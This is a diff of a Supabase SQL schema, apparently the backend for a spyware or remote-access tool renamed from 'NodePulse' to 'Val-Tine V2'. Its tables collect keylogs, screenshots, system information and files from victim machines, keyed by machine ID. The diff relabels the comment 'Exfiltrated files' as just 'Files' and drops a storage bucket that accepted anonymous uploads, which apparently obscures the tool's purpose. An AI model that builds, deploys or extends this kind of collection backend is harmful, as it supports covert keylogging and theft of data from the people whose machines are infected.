@@ -1,6 +1,6 @@
-
 -- =============================================
--- NodePulse Simplified Schema (consolidated)
+-- Val-Tine V2 — Database Schema
+-- Paste this into Supabase SQL Editor first.
 -- =============================================
 
 -- Clients table
@@ -55,7 +55,7 @@ CREATE TABLE IF NOT EXISTS public.keylogs (
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
--- Exfiltrated files
+-- Files
 CREATE TABLE IF NOT EXISTS public.files (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   machine_id TEXT NOT NULL,
@@ -130,23 +130,3 @@ CREATE INDEX IF NOT EXISTS idx_system_info_machine_id ON public.system_info(mach
 CREATE INDEX IF NOT EXISTS idx_screenshots_machine_id ON public.screenshots(machine_id);
 CREATE INDEX IF NOT EXISTS idx_keylogs_machine_id ON public.keylogs(machine_id);
 CREATE INDEX IF NOT EXISTS idx_files_machine_id ON public.files(machine_id);
-
--- Storage buckets
-INSERT INTO storage.buckets (id, name, public)
-VALUES ('file-transfers', 'file-transfers', false)
-ON CONFLICT (id) DO NOTHING;
-
--- Storage RLS policies for file-transfers
-DO $$ BEGIN
-  CREATE POLICY "Allow authenticated users to read file-transfers"
-  ON storage.objects FOR SELECT
-  USING (bucket_id = 'file-transfers');
-EXCEPTION WHEN duplicate_object THEN NULL;
-END $$;
-
-DO $$ BEGIN
-  CREATE POLICY "Allow anon uploads to file-transfers"
-  ON storage.objects FOR INSERT
-  WITH CHECK (bucket_id = 'file-transfers');
-EXCEPTION WHEN duplicate_object THEN NULL;
-END $$;
